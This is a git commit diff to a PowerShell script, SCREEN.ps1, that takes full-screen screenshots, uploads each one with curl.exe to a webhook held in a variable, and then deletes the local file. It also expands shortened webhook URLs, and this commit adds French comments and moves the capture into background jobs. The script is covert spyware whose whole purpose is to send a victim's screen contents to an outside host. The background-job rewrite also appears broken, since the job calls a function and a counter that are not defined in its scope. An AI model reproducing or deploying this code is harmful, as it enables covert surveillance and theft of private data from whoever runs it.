ccf9e88ab26f81086f642103893def1eff0aed7a
Alyoutubers <142686309+Alyoutubers@users.noreply.github.com>
2024-02-05 23:53:52 +0100

    Update SCREEN.ps1

--- SCREEN.ps1
+++ SCREEN.ps1
@@ -1,27 +1,41 @@
 $hookurl = "$dc"
-$seconds = 30 # Screenshot interval
-$a = 1 # Sceenshot amount
+$seconds = 3 # Intervalle entre les captures d'écran en secondes
+$a = 1 # Nombre de captures d'écran à prendre
 
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
-
-While ($a -gt 0){
-$Filett = "$env:temp\SC.png"
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-Start-Sleep 1
-curl.exe -F "file1=@$filett" $hookurl
-Start-Sleep 1
-Remove-Item -Path $filett
-Start-Sleep $seconds
-$a--
+# Détection de l'URL raccourcie
+if ($hookurl.Length -ne 121) {
+    Write-Host "URL du webhook raccourcie détectée.." 
+    $hookurl = (irm $hookurl).url
 }
+
+# Fonction pour prendre une capture d'écran
+Function TakeScreenshot {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+}
+
+# Fonction pour exécuter la capture d'écran en arrière-plan
+Function RunInBackground {
+    While ($a -gt 0) {
+        Start-Job -ScriptBlock { TakeScreenshot } | Out-Null
+        Start-Sleep $seconds
+        $a--
+    }
+}
+
+# Exécuter la fonction en arrière-plan
+RunInBackground
